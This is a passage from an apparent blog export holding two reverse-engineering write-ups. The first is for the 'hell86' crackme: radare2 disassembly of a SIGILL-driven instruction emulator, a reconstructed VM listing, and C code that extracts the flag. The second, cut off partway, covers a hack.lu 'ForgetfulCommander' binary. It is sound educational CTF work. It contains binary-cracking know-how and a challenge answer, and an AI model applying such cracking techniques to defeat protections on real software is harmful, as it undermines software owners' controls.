encountered a bug\u0026quot; │ ││││ 0x0000101d 480f45f8 cmovne rdi, rax │ ││││ ; CODE XREFS from main (0xffd, 0x100a) │ ╰╰───\u0026gt; 0x00001021 e80affffff call sym.imp.puts ; int puts(const char *s) │ ││ 0x00001026 31d2 xor edx, edx │ ││ ; CODE XREFS from main (0xfd7, 0xfe5) │ ╰╰─\u0026gt; 0x00001028 89d0 mov eax, edx │ 0x0000102a 5a pop rdx │ 0x0000102b 5b pop rbx │ 0x0000102c 5d pop rbp ╰ 0x0000102d c3 ret make_alt_stack allocates 8192 bytes from the heap which will be used as a stack for the signal handler which has been registered with SA_ONSTACK (sigaltstack syscall)\n[0x00000fc0]\u0026gt; pdf @register_sigill ╭ (fcn) register_sigill 97 │ register_sigill (); │ ; var int local_8h @ rsp+0x8 │ ; var int local_10h @ rsp+0x10 │ ; var int local_90h @ rsp+0x90 │ ; CALL XREF from main (0xfd9) │ 0x00001965 53 push rbx │ 0x00001966 31c0 xor eax, eax │ 0x00001968 b926000000 mov ecx, 0x26 │ 0x0000196d 4881eca00000. sub rsp, 0xa0 │ 0x00001974 488d7c2408 lea rdi, [local_8h] │ 0x00001979 f3ab rep stosd dword [rdi], eax │ 0x0000197b 488d05c4ffff. lea rax, [0x00001946] ; SIGILL handler │ 0x00001982 488d7c2410 lea rdi, [local_10h] │ 0x00001987 c78424900000. mov dword [local_90h], 0x8000004 ; SA_ONSTACK | SA_SIGINFO │ 0x00001992 4889442408 mov qword [local_8h], rax │ 0x00001997 e8c4f5ffff call sym.imp.sigfillset │ 0x0000199c 31d2 xor edx, edx │ 0x0000199e 85c0 test eax, eax │ ╭─\u0026lt; 0x000019a0 7519 jne 0x19bb │ │ 0x000019a2 488d5c2408 lea rbx, [local_8h] │ │ 0x000019a7 31d2 xor edx, edx │ │ 0x000019a9 bf04000000 mov edi, SIGILL │ │ 0x000019ae 4889de mov rsi, rbx │ │ 0x000019b1 e8daf5ffff call sym.imp.sigaction │ │ 0x000019b6 85c0 test eax, eax │ │ 0x000019b8 0f94c2 sete dl │ │ ; CODE XREF from register_sigill (0x19a0) │ ╰─\u0026gt; 0x000019bb 4881c4a00000. add rsp, 0xa0 │ 0x000019c2 88d0 mov al, dl │ 0x000019c4 5b pop rbx ╰ 0x000019c5 c3 ret register_sigill registers a SIGILL handler using the flags SA_ONSTACK and SA_SIGINFO. So when the handler gets called, the alternate stack is used. And the handler has the following signature\nvoid handler(int sig, siginfo_t *info, void *ucontext); Let\u0026rsquo;s try to disassemble verify_flag\n[0x00000fc0]\u0026gt; pd 10 @ verify_flag ╭ (fcn) verify_flag 115 │ verify_flag (); │ ; CALL XREF from main (0xfed) │ 0x00001190 0f0b ud2 │ 0x00001192 0200 add al, byte [rax] │ 0x00001194 0000 add byte [rax], al │ 0x00001196 0000 add byte [rax], al │ 0x00001198 0000 add byte [rax], al │ 0x0000119a 090d00000f0b or dword [0x0b0f11a0], ecx │ 0x000011a0 0200 add al, byte [rax] │ 0x000011a2 0000 add byte [rax], al │ 0x000011a4 0000 add byte [rax], al │ 0x000011a6 0000 add byte [rax], al  Woah! That\u0026rsquo;s garbage ! How does the flag gets verified ??\n Well, the first instruction is ud2. This generates an Invalid Opcode Exception, ie., it triggers SIGILL.\nLet\u0026rsquo;s dive into the sigill_handler routine.\n[0x00000fc0]\u0026gt; pd 6 @0x1946 ; DATA XREF from register_sigill (0x197b) 0x00001946 488b82a80000. mov rax, qword [rdx + 0xa8] ; gp_regs.rip 0x0000194d 488d7228 lea rsi, [rdx + 0x28] ; \u0026amp; ucontext-\u0026gt;gp_regs 0x00001951 488d7802 lea rdi, [rax + 2] 0x00001955 4883c00e add rax, 0xe 0x00001959 488982a80000. mov qword [rdx + 0xa8], rax ╭─\u0026lt; 0x00001960 e97b050000 jmp 0x1ee0 [0x00000fc0]\u0026gt; pd 3 @0x1ee0 ; CODE XREF from verify_flag (+0x7d0) 0x00001ee0 0fb65708 movzx edx, byte [rdi + 8] 0x00001ee4 488d05951120. lea rax, [0x00203080] 0x00001eeb ff24d0 jmp qword [rax + rdx*8] [0x00000fc0]\u0026gt; px/4xg @0x203080 0x00203080 0x0000000000001a1f 0x0000000000001a20 0x00203090 0x0000000000001a39 0x0000000000001a52 The handler increments the instruction pointer by 14 bytes and jumps to the instruction specified by the index [rdi+8]. The array at 0x203080 contains addresses of routines for emulating instructions.\nFor example the routine at 0x1a20 has\n[0x00000fc0]\u0026gt; pd 7 @0x1a20 0x00001a20 0fb64f0a movzx ecx, byte [rdi + 0xa] 0x00001a24 0fb6470b movzx eax, byte [rdi + 0xb] 0x00001a28 0fb65709 movzx edx, byte [rdi + 9] 0x00001a2c 488b04c6 mov rax, qword [rsi + rax*8] 0x00001a30 480304ce add rax, qword [rsi + rcx*8] 0x00001a34 488904d6 mov qword [rsi + rdx*8], rax 0x00001a38 c3 ret rsi stores the base address of the array of GPRs in the ucontext. So, this routine adds registers (indexed by rdi).\nRecall that rip is incremented by 14 bytes. Those 14 bytes are used to store the information for each instruction. Each of the 14 byte block starts with a ud2.\nSo we have,\nstruct insn_t { int16_t ud2_op; // marks the beginning of instruction. rip points here  char __unknown[8]; // rdi points here. rdi = rip+2  uint8_t instr; // instruction index  uint8_t dest; // destination register  uint8_t src_regs[2]; // source registers  }; We need to figure out the \u0026lsquo;__unknown\u0026rsquo; member and the order of the source registers.\nLet\u0026rsquo;s move to the next routine at 0x1a39\n[0x00000fc0]\u0026gt; pd 7 @0x1a39 0x00001a39 0fb6470a movzx eax, byte [rdi + 0xa] ; src1 0x00001a3d 0fb64f0b movzx ecx, byte [rdi + 0xb] ; src2 0x00001a41 0fb65709 movzx edx, byte [rdi + 9] ; dst 0x00001a45 488b04c6 mov rax, qword [rsi + rax*8] 0x00001a49 482b04ce sub rax, qword [rsi + rcx*8] 0x00001a4d 488904d6 mov qword [rsi + rdx*8], rax ; dst = src1-src2 0x00001a51 c3 ret Great! Now we get the order of the source registers. Let\u0026rsquo;s rewrite the instruction struct\nstruct insn_t { int16_t ud2_op; // marks the beginning of instruction. rip points here  char __unknown[8]; // rdi points here. rdi = rip+2  uint8_t instr; // instruction index  uint8_t dest; // destination register  uint8_t src1; // source register 1  uint8_t src2; // source register 2  }; Let\u0026rsquo;s move to the function at 0x1ada\n[0x00000fc0]\u0026gt; pd 7 @0x1ada 0x00001ada 0fb64709 movzx eax, byte [rdi + 9] ; dst 0x00001ade 488b17 mov rdx, qword [rdi] ; __unknown 0x00001ae1 488914c6 mov qword [rsi + rax*8], rdx 0x00001ae5 c3 ret Cool ! this copies __unknown to the dest register. So, this is emulates move immediate.\nGreat ! now we have figured out the __unknown\nstruct insn_t { int16_t ud2_op; // marks the beginning of instruction. rip points here  int64_t imm; // immediate value  uint8_t instr; // instruction index  uint8_t dest; // destination register  uint8_t src1; // source register 1  uint8_t src2; // source register 2  }; I\u0026rsquo;ve renamed the functions at 0x203080\n.data:0000000000203080 off_203080 dq offset nullsub_2 .data:0000000000203088 dq offset add .data:0000000000203090 dq offset sub .data:0000000000203098 dq offset mul .data:00000000002030A0 dq offset quot .data:00000000002030A8 dq offset rem .data:00000000002030B0 dq offset sar .data:00000000002030B8 dq offset shl .data:00000000002030C0 dq offset neg .data:00000000002030C8 dq offset mov_imm .data:00000000002030D0 dq offset movzx_byte_reg_imm .data:00000000002030D8 dq offset movsx_byte_reg_imm .data:00000000002030E0 dq offset movzx_word_reg_imm .data:00000000002030E8 dq offset movsx_word_reg_imm .data:00000000002030F0 dq offset mov_dword_reg_imm .data:00000000002030F8 dq offset movsx_dword_reg_imm .data:0000000000203100 dq offset mov_reg_qmem .data:0000000000203108 dq offset mov_mem_byte .data:0000000000203110 dq offset mov_mem_word .data:0000000000203118 dq offset mov_mem_dword .data:0000000000203120 dq offset mov_mem_qword .data:0000000000203128 dq offset push_reg .data:0000000000203130 dq offset push_imm .data:0000000000203138 dq offset pop_reg .data:0000000000203140 dq offset mov_reg_reg .data:0000000000203148 dq offset or .data:0000000000203150 dq offset and .data:0000000000203158 dq offset xor .data:0000000000203160 dq offset not .data:0000000000203168 dq offset cmp_lt .data:0000000000203170 dq offset cmp_le .data:0000000000203178 dq offset cmp_gt .data:0000000000203180 dq offset cmp_ge .data:0000000000203188 dq offset cmp_eq .data:0000000000203190 dq offset cmp_neq .data:0000000000203198 dq offset cmp_eq_imm .data:00000000002031A0 dq offset cmp_neq_imm .data:00000000002031A8 dq offset cmp_reg_zero .data:00000000002031B0 dq offset jmp_imm_if_zero .data:00000000002031B8 dq offset jmp_imm_if_notzero .data:00000000002031C0 dq offset call_imm .data:00000000002031C8 dq offset ret .data:00000000002031D0 dq offset ret_if_reg_not_zero .data:00000000002031D8 dq offset ret_if_reg_zero .data:00000000002031E0 dq offset lea_reg_imm .data:00000000002031E8 dq offset sar_imm .data:00000000002031F0 dq offset shl_imm .data:00000000002031F8 dq offset or_imm .data:0000000000203200 dq offset and_imm .data:0000000000203208 dd offset xor_imm So, the verify_flag routine is an array of insn_t. The flag is verified by emulating the instructions through a SIGILL. Now we need to write a disassembler for verify_flag\nHere\u0026rsquo;s the disassembly of verify_flag. I\u0026rsquo;ve defined some new instructions like\n   Instruction Syntax Description     ret.z ret.z reg returns if reg is zero   ret.nz ret.nz reg returns if reg is non zero   if.z if.z reg, jmp offset if reg is zero, goto offset   if.nz if.nz reg, jmp offset if reg is not zero, goto offset   cmp.cc cmp.cc Rd, Rs, Rt compare registers Rs and Rt and set the result of condition cc into Rd   div.quot div.quot Rd, Rs, Rt Rd = ⌊Rs/Rt⌋   div.rem div.rem Rd, Rs, Rt Rd = Rs mod Rt    00000000 mov rax, 0x2 00000001 cmp.neq r8, rdi, 0x2 ; argc must be 2 00000002 ret.nz r8 00000003 lea rsi, [rsi + 0x8] 00000004 mov rdi, qword [rsi + 0] ; argv[1] 00000005 jmp 0x6 00000006 push rbp 00000007 mov rbp, rsp 00000008 lea rsp, [rsp + 0xfffffff0] 00000009 mov qword [rbp + 0xfffffff0], rdi 0000000a call 0x73 ; find length 0000000b cmp.neq rax, rax, 0x24 ; len(argv[1]) == 0x24 0000000c if.nz rax, jmp 0x29 0000000d mov rdi, 0x20cd ; \u0026quot;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+\u0026quot; 0000000e call 0x73 0000000f mov qword [rbp + 0xfffffff8], rax 00000010 mov rdi, qword [rbp + 0xfffffff0] 00000011 mov rsi, 0x20cd ; \u0026quot;FLAG{\u0026quot; 00000012 mov rdx, rax 00000013 call 0x79 ; compare strings 00000014 if.nz rax, jmp 0x29 00000015 mov rdi, qword [rbp + 0xfffffff0] 00000016 movzx rsi, byte [rdi + 0x23] 00000017 cmp.neq rsi, rsi, 0x7d ; input[0x23] == '}' 00000018 if.nz rsi, jmp 0x29 00000019 mov rsi, qword [rbp + 0xfffffff8] 0000001a add rdi, rdi, rsi ; rdi += len(\u0026quot;FLAG{\u0026quot;) 0000001b neg rsi, rsi 0000001c lea rsi, [rsi + 0x23] ; rsi = 0x23-5 = 0x1e 0000001d push rsi 0000001e call 0x2d ; compute indices 0000001f pop rsi 00000020 if.z rax, jmp 0x29 00000021 mov rdi, rax 00000022 push rdi ; array of indices 00000023 call 0x51 ; validate the flag 00000024 pop rdi 00000025 push rax 00000026 call [free] 00000027 pop rax 00000028 jmp 0x2a ; good jump 00000029 mov rax, 0x1 ; bad jump 0000002a mov rsp, rbp 0000002b pop rbp 0000002c ret 0000002d mov rax, 0 0000002e ret.z rsi 0000002f push rdi ; string 00000030 push rsi ; len 00000031 shl rdi, rsi, 0x3 00000032 call [malloc] ; allocate len*8 bytes 00000033 pop rsi 00000034 pop rdi 00000035 ret.z rax ; return 0 if malloc failed 00000036 mov r8, rax 00000037 mov r9, rax 00000038 push r9 00000039 push r8 0000003a push rdi 0000003b push rsi 0000003c movzx rsi, byte [rdi + 0] ; char 0000003d mov rdi, 0x20a0 ; \u0026quot;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+\u0026quot; 0000003e call 0x84 ; strchr 0000003f pop rsi 00000040 pop rdi 00000041 pop r8 00000042 pop r9 00000043 if.z rax, jmp 0x4d 00000044 mov r10, 0x20a0 00000045 sub rax, rax, r10 ; index of char 00000046 mov qword [r9 + 0], rax ; store index 00000047 lea r9, [r9 + 0x8] 00000048 lea rdi, [rdi + 0x1] ; next char 00000049 lea rsi, [rsi + 0xffffffff] 0000004a if.nz rsi, jmp 0x38 0000004b mov rax, r8 ; return array of indices 0000004c ret 0000004d mov rdi, r8 0000004e call [free] 0000004f mov rax, 0 00000050 ret 00000051 mov rax, 0x1 00000052 ret.z rsi 00000053 mov r8, qword [rdi + 0] 00000054 cmp.neq r8, r8, 0x16 ; the first index is 0x16 00000055 ret.nz r8 00000056 push rdi ; indices array 00000057 push rsi ; no.of elements 00000058 call 0x66 ; some transformation applied 00000059 pop rsi 0000005a pop rdi 0000005b lea rsi, [rsi + 0xffffffff] 0000005c push rdi ; transformed array 0000005d shl rdx, rsi, 0x3 ; #bytes = #qwords * 8 0000005e mov rsi, 0x1fa0 ; magic array 0000005f call 0x79 ; compare arrays 00000060 pop rdi 00000061 mov r8, rax ; must return 0 00000062 mov rax, 0x1 00000063 ret.nz r8 00000064 mov rax, 0 00000065 ret 00000066 ret.z rsi ; the transformation 00000067 lea rsi, [rsi + 0xffffffff] 00000068 ret.z rsi 00000069 mov r8, qword [rdi + 0] 0000006a mov r9, qword [rdi + 0x8] 0000006b sub r8, r9, r8 ; rdi[1]-rdi[0] 0000006c xor r8, r8, rsi ; rsi ^ rdi[1]-rdi[0] 0000006d mul r9, r8, r8 0000006e mul r8, r9, r8 ; r8 = (rsi ^ rdi[1]-rdi[0])**3 0000006f mov qword [rdi + 0], r8 00000070 lea rdi, [rdi + 0x8] 00000071 lea rsi, [rsi + 0xffffffff] 00000072 jmp 0x68 00000073 mov rax, 0 00000074 movzx r10, byte [rdi + 0] 00000075 ret.z r10 00000076 lea rdi, [rdi + 0x1] 00000077 lea rax, [rax + 0x1] 00000078 jmp 0x74 00000079 mov rax, 0 0000007a ret.z rdx 0000007b movzx r8, byte [rdi + 0] 0000007c movzx r9, byte [rsi + 0] 0000007d xor r8, r8, r9 0000007e or rax, rax, r8 0000007f lea rdx, [rdx + 0xffffffff] 00000080 lea rdi, [rdi + 0x1] 00000081 lea rsi, [rsi + 0x1] 00000082 if.nz rdx, jmp 0x7b 00000083 ret 00000084 mov rax, rdi 00000085 movzx r8, byte [rax + 0] 00000086 if.z r8, jmp 0x8b 00000087 cmp.eq r8, r8, rsi 00000088 ret.nz r8 00000089 lea rax, [rax + 0x1] 0000008a jmp 0x85 0000008b mov rax, 0 0000008c ret Now let\u0026rsquo;s analyze the disassembled code.\nThe routine at 0x73 finds the length of the string pointed to by rdi.\n0x79 compares byte arrays for equality. It xor\u0026rsquo;s the respective bytes and performs a bitwise-or of the xor\u0026rsquo;s. If the strings are equal then the result will be zero.\nThe routine at 0x2d is like this\nlong* get_indices(char* buf, int size) { long* words = (long*) malloc(size \u0026lt;\u0026lt; 3); static char set[] = \u0026#34;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+\u0026#34;; for (int i = 0; i \u0026lt; size; ++i) { words[i] = strchr(set, buf[i])-buf; } return words; } Now the function at 0x51 is called with the array of indices. It applies a transformation on the array of indices and compares the modified array with the array of bytes at 0x1fa0. If they are equal we get to return 0 (success).\n0x66 works like this\nvoid modify(long* words, int count) { while (--count \u0026gt; 0) { long temp = words[1]-words[0] ^ count; *words++ = temp*temp*temp; } } To find the flag, we have the modified array at 0x1fa0, the starting index as 0x16. Here\u0026rsquo;s the code\nvoid solve(char* elf) { int64_t* delta = (int64_t*) (elf+0x1fa0); printf(\u0026#34;-=-=-=- FLAG{\u0026#34;); char set[] = \u0026#34;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+\u0026#34;; int i = 0x16, count = 0x1e; while (count--) { printf(\u0026#34;%c\u0026#34;, set[i]); int m = (int) round(cbrt(*delta++)); i += m^count; } printf(\u0026#34;} -=-=-=-\\n\u0026#34;); } int main() { int fd = open(\u0026#34;hell86\u0026#34;, 0); if (fd == -1) { fprintf(stderr, \u0026#34;open failed !\\n\u0026#34;); exit(1); } struct stat stbuf = {0}; fstat(fd, \u0026amp;stbuf); char* buffer = mmap(NULL, stbuf.st_size, PROT_READ, MAP_PRIVATE, fd, 0); if (! buffer) { close(fd); fprintf(stderr, \u0026#34;mmap failed !\\n\u0026#34;); exit(2); } solve(buffer); munmap(buffer, stbuf.st_size); close(fd); } Which outputs\n-=-=-=- FLAG{x86-1s-s0-fund4m3nt4lly-br0k3n} -=-=-=-  Here\u0026rsquo;s the complete code (including the disassembler)\n#include \u0026lt;math.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;elf.h\u0026gt; char* regs[] = { \u0026#34;r8\u0026#34;, \u0026#34;r9\u0026#34;, \u0026#34;r10\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;r12\u0026#34;, \u0026#34;r13\u0026#34;, \u0026#34;r14\u0026#34;, \u0026#34;r15\u0026#34;, \u0026#34;rdi\u0026#34;, \u0026#34;rsi\u0026#34;, \u0026#34;rbp\u0026#34;, \u0026#34;rbx\u0026#34;, \u0026#34;rdx\u0026#34;, \u0026#34;rax\u0026#34;, \u0026#34;rcx\u0026#34;, \u0026#34;rsp\u0026#34;, \u0026#34;rip\u0026#34; }; #pragma pack(push, 1)  struct instr_t { uint16_t ud2; uint64_t imm; uint8_t instr; uint8_t dest; uint8_t src1; uint8_t src2; }; #pragma pack(pop)  // printf(fmt_strings[i], imm, dest, src1, src2)  char* fmt_strings[] = { \u0026#34;nop\u0026#34;, \u0026#34;add %2$s, %3$s, %4$s\u0026#34;, \u0026#34;sub %2$s, %3$s, %4$s\u0026#34;, \u0026#34;mul %2$s, %3$s, %4$s\u0026#34;, \u0026#34;div.quot %2$s, %3$s, %4$s\u0026#34;, \u0026#34;div.rem %2$s, %3$s, %4$s\u0026#34;, \u0026#34;sar %2$s, %3$s, %4$s\u0026#34;, \u0026#34;shl %2$s, %3$s, %4$s\u0026#34;, \u0026#34;neg %2$s, %3$s\u0026#34;, \u0026#34;mov %2$s, %1$#x\u0026#34;, \u0026#34;movzx %2$s, byte [%3$s + %1$#x]\u0026#34;, \u0026#34;movsx %2$s, byte [%3$s + %1$#x]\u0026#34;, \u0026#34;movzx %2$s, word [%3$s + %1$#x]\u0026#34;, \u0026#34;movsx %2$s, word [%3$s + %1$#x]\u0026#34;, \u0026#34;mov %2$s, dword [%3$s + %1$#x]\u0026#34;, \u0026#34;movsxd %2$s, dword [%3$s + %1$#x]\u0026#34;, \u0026#34;mov %2$s, qword [%3$s + %1$#x]\u0026#34;, \u0026#34;mov byte [%3$s + %1$#x], %4$s\u0026#34;, \u0026#34;mov word [%3$s + %1$#x], %4$s\u0026#34;, \u0026#34;mov dword [%3$s + %1$#x], %4$s\u0026#34;, \u0026#34;mov qword [%3$s + %1$#x], %4$s\u0026#34;, \u0026#34;push %3$s\u0026#34;, \u0026#34;push %1$#x\u0026#34;, \u0026#34;pop %2$s\u0026#34;, \u0026#34;mov %2$s, %3$s\u0026#34;, \u0026#34;or %2$s, %3$s, %4$s\u0026#34;, \u0026#34;and %2$s, %3$s, %4$s\u0026#34;, \u0026#34;xor %2$s, %3$s, %4$s\u0026#34;, \u0026#34;not %2$s, %3$s\u0026#34;, \u0026#34;cmp.lt %2$s, %3$s, %4$s\u0026#34;, \u0026#34;cmp.le %2$s, %3$s, %4$s\u0026#34;, \u0026#34;cmp.gt %2$s, %3$s, %4$s\u0026#34;, \u0026#34;cmp.ge %2$s, %3$s, %4$s\u0026#34;, \u0026#34;cmp.eq %2$s, %3$s, %4$s\u0026#34;, \u0026#34;cmp.neq %2$s, %3$s, %4$s\u0026#34;, \u0026#34;cmp.eq %2$s, %3$s, %1$#x\u0026#34;, \u0026#34;cmp.neq %2$s, %3$s, %1$#x\u0026#34;, \u0026#34;cmp.z %2$s, %3$s ; %2$s = %3$s == 0\u0026#34;, \u0026#34;if.z %3$s, jmp %1$#x\u0026#34;, \u0026#34;if.nz %3$s, jmp %1$#x\u0026#34;, \u0026#34;call %1$#x\u0026#34;, \u0026#34;ret\u0026#34;, \u0026#34;ret.nz %3$s ; return if %3$s is not zero\u0026#34;, \u0026#34;ret.z %3$s ; return if %3$s is zero\u0026#34;, \u0026#34;lea %2$s, [%3$s + %1$#x]\u0026#34;, \u0026#34;sar %2$s, %3$s, %1$#hx\u0026#34;, \u0026#34;shl %2$s, %3$s, %1$#hx\u0026#34;, \u0026#34;or %2$s, %3$s, %1$#x\u0026#34;, \u0026#34;and %2$s, %3$s, %1$#x\u0026#34;, \u0026#34;xor %2$s, %3$s, %1$#x\u0026#34; }; char* resolve(char* elf, uint64_t addr) { // resolve address  Elf64_Ehdr* header = (Elf64_Ehdr*) elf; Elf64_Shdr* section = (Elf64_Shdr*) (elf + header-\u0026gt;e_shoff); int n_sections = header-\u0026gt;e_shnum; Elf64_Shdr *strtab = 0, *symtab = 0, *rela = 0; for (int i = 0; i \u0026lt; n_sections; ++i) { if (!strtab \u0026amp;\u0026amp; section-\u0026gt;sh_type == SHT_STRTAB \u0026amp;\u0026amp; section-\u0026gt;sh_offset != header-\u0026gt;e_shstrndx) strtab = section; else if (!symtab \u0026amp;\u0026amp; (section-\u0026gt;sh_type == SHT_SYMTAB || section-\u0026gt;sh_type == SHT_DYNSYM)) symtab = section; else if (!rela \u0026amp;\u0026amp; section-\u0026gt;sh_type == SHT_RELA) rela = section; section++; } Elf64_Sym* sym = (Elf64_Sym*) (elf+symtab-\u0026gt;sh_offset); char* names = elf+strtab-\u0026gt;sh_offset; Elf64_Rela* reloc = (Elf64_Rela*) (elf+rela-\u0026gt;sh_offset); int n_relocs = rela-\u0026gt;sh_size / sizeof(Elf64_Rela); for (int i = 0; i \u0026lt; n_relocs; ++i) { if (reloc-\u0026gt;r_offset == addr) { // addr has an entry in reloc  int sym_idx = reloc-\u0026gt;r_info \u0026gt;\u0026gt; 32; Elf64_Sym* symb = sym+sym_idx;; return names+symb-\u0026gt;st_name; } reloc++; } return NULL; } void solve(char* elf) { int64_t* delta = (int64_t*) (elf+0x1fa0); printf(\u0026#34;-=-=-=- FLAG{\u0026#34;); char set[] = \u0026#34;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+\u0026#34;; int i = 0x16, count = 0x1e; while (count--) { printf(\u0026#34;%c\u0026#34;, set[i]); int m = (int) round(cbrt(*delta++)); i += m^count; } printf(\u0026#34;} -=-=-=-\\n\u0026#34;); } int main() { int fd = open(\u0026#34;hell86\u0026#34;, 0); if (fd == -1) { fprintf(stderr, \u0026#34;open failed !\\n\u0026#34;); exit(1); } struct stat stbuf = {0}; fstat(fd, \u0026amp;stbuf); char* buffer = mmap(NULL, stbuf.st_size, PROT_READ, MAP_PRIVATE, fd, 0); if (! buffer) { close(fd); fprintf(stderr, \u0026#34;mmap failed !\\n\u0026#34;); exit(2); } char* start = buffer+0x1190; uint32_t eip = 0; while (start \u0026lt; buffer+0x1946) { struct instr_t* i = (struct instr_t*) start; printf(\u0026#34;%08x%10s\u0026#34;, eip, \u0026#34;\u0026#34;); eip++; if (i-\u0026gt;instr == 40 \u0026amp;\u0026amp; 0 == i-\u0026gt;imm) printf(\u0026#34;call [%s]\u0026#34;, resolve(buffer, (char*)(\u0026amp;i-\u0026gt;imm)-buffer)); else { uint64_t offset = (i-\u0026gt;imm-0x1190)/sizeof(struct instr_t); uint64_t imm = i-\u0026gt;imm; if (i-\u0026gt;instr == 9 \u0026amp;\u0026amp; i-\u0026gt;dest == 0x10) printf(\u0026#34;jmp %#lx\u0026#34;, offset); else { if (i-\u0026gt;instr \u0026gt;= 38 \u0026amp;\u0026amp; i-\u0026gt;instr \u0026lt;= 40) imm = offset; printf(fmt_strings[i-\u0026gt;instr], imm, regs[i-\u0026gt;dest], regs[i-\u0026gt;src1], regs[i-\u0026gt;src2]); } } putchar(10); start += sizeof (struct instr_t); } solve(buffer); munmap(buffer, stbuf.st_size); close(fd); } ","date":"2019-01-13T00:00:00+05:30","permalink":"http://localhost:1313/post/crackmes.one-hell86/","title":"crackmes.one - hell86"},{"content":"I\u0026rsquo;ll do static analysis using radare.\n┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/hacklu/ForgetfulCommander/public] └──╼ $ objdump -d -M intel -j.text forgetful_commander forgetful_commander: file format elf32-i386 Disassembly of section .text: 00002050 \u0026lt;.text\u0026gt;: 2050: 99 cdq 2051: 67 cd 30 addr16 int 0x30 2054: a5 movs DWORD PTR es:[edi],DWORD PTR ds:[esi] 2055: 02 fc add bh,ah ... Ahh ! So we have garbage in .text. Fire up radare :-)\n0x0000d000 50 push eax 0x0000d001 60 pushal 0x0000d002 9c pushfd 0x0000d003 81ec00500000 sub esp, 0x5000 0x0000d009 b855000000 mov eax, 0x55 ; 'U' 0x0000d00e 6878650000 push 0x6578 ; 'xe' 0x0000d013 686c662f65 push 0x652f666c ; 'lf/e' 0x0000d018 68632f7365 push 0x65732f63 ; 'c/se' 0x0000d01d 682f70726f push 0x6f72702f ; '/pro' 0x0000d022 89e3 mov ebx, esp 0x0000d024 8d8c24104000. lea ecx, [arg_4010h] ; 0x4010 0x0000d02b baff0f0000 mov edx, 0xfff ;-- syscall.readlink: 0x0000d030 cd80 int 0x80 0x0000d032 83c410 add esp, 0x10 0x0000d035 83f800 cmp eax, 0 0x0000d038 0f8e92010000 jle 0xd1d0 0x0000d03e 89c7 mov edi, eax 0x0000d040 8d8c04004000. lea ecx, [esp + eax + 0x4000] 0x0000d047 c6010a mov byte [ecx], 0xa 0x0000d04a 47 inc edi 0x0000d04b b805000000 mov eax, 5 0x0000d050 6861707300 push 0x737061 ; 'aps' 0x0000d055 686c662f6d push 0x6d2f666c ; 'lf/m' 0x0000d05a 68632f7365 push 0x65732f63 ; 'c/se' 0x0000d05f 682f70726f push 0x6f72702f ; '/pro' 0x0000d064 89e3 mov ebx, esp 0x0000d066 31c9 xor ecx, ecx ;-- syscall.open: 0x0000d068 cd80 int 0x80 0x0000d06a 83c410 add esp, 0x10 0x0000d06d 83f800 cmp eax, 0 0x0000d070 0f8c5a010000 jl 0xd1d0 0x0000d076 89c6 mov esi, eax So, the program reads the path of its executable, i.e., the path for \u0026lsquo;forgetful_commander\u0026rsquo; using sys_readlink and opens the file '/proc/self/maps'\n0x0000d078 b803000000 mov eax, 3 0x0000d07d 89f3 mov ebx, esi 0x0000d07f 89e1 mov ecx, esp 0x0000d081 ba00400000 mov edx, 0x4000 ;-- syscall.read: 0x0000d086 cd80 int 0x80 0x0000d088 83f800 cmp eax, 0 0x0000d08b 0f8ee9000000 jle 0xd17a 0x0000d091 31c9 xor ecx, ecx 0x0000d093 31d2 xor edx, edx 0x0000d095 bd01000000 mov ebp, 1 ; flag for breaking loop ; CODE XREFS from entry0 (0xd0b7, 0xd0c6) 0x0000d09a 39c1 cmp ecx, eax 0x0000d09c 0f8d29000000 jge 0xd0cb 0x0000d0a2 0fb61c0c movzx ebx, byte [esp + ecx] 0x0000d0a6 41 inc ecx 0x0000d0a7 389c14004000. cmp byte [esp + edx + 0x4000], bl 0x0000d0ae 0f8510000000 jne 0xd0c4 0x0000d0b4 42 inc edx 0x0000d0b5 39fa cmp edx, edi 0x0000d0b7 0f85ddffffff jne 0xd09a 0x0000d0bd 31ed xor ebp, ebp 0x0000d0bf e907000000 jmp 0xd0cb ; CODE XREF from entry0 (0xd0ae) 0x0000d0c4 31d2 xor edx, edx 0x0000d0c6 e9cfffffff jmp 0xd09a ; CODE XREFS from entry0 (0xd09c, 0xd0bf) 0x0000d0cb 85ed test ebp, ebp 0x0000d0cd 0f85a5ffffff jne 0xd078 Here we have a loop which reads a block of 16K bytes and searches for the path to its executable followed by a newline. The loop breaks when ecx is the offset of the newline in the string.\n0x0000d0d3 31db xor ebx, ebx 0x0000d0d5 49 dec ecx 0x0000d0d6 83f900 cmp ecx, 0 0x0000d0d9 0f9fc3 setg bl 0x0000d0dc 807c0cff0a cmp byte [esp + ecx - 1], 0xa ; prev newline 0x0000d0e1 0f95c7 setne bh 0x0000d0e4 84fb test bl, bh 0x0000d0e6 0f85e7ffffff jne 0xd0d3 This loop searches for the offset of the previous newline and breaks when ecx points to the beginning of line containing the executable path.\n0x0000d0ec 31d2 xor edx, edx 0x0000d0ee 89cd mov ebp, ecx 0x0000d0f0 83c108 add ecx, 8 ; 32bit address ; CODE XREFS from entry0 (0xd118, 0xd140, 0xd168) 0x0000d0f3 39cd cmp ebp, ecx 0x0000d0f5 0f8d7f000000 jge 0xd17a 0x0000d0fb c1c204 rol edx, 4 0x0000d0fe 31db xor ebx, ebx 0x0000d100 803c2c30 cmp byte [esp + ebp], 0x30 ; '0' 0x0000d104 0f9dc3 setge bl 0x0000d107 803c2c39 cmp byte [esp + ebp], 0x39 ; '9' 0x0000d10b 0f9ec7 setle bh 0x0000d10e 802c2c30 sub byte [esp + ebp], 0x30 ; '0' 0x0000d112 32142c xor dl, byte [esp + ebp] 0x0000d115 45 inc ebp 0x0000d116 84fb test bl, bh 0x0000d118 0f85d5ffffff jne 0xd0f3 0x0000d11e 4d dec ebp 0x0000d11f 32142c xor dl, byte [esp + ebp] 0x0000d122 80042c30 add byte [esp + ebp], 0x30 ; '0' 0x0000d126 31db xor ebx, 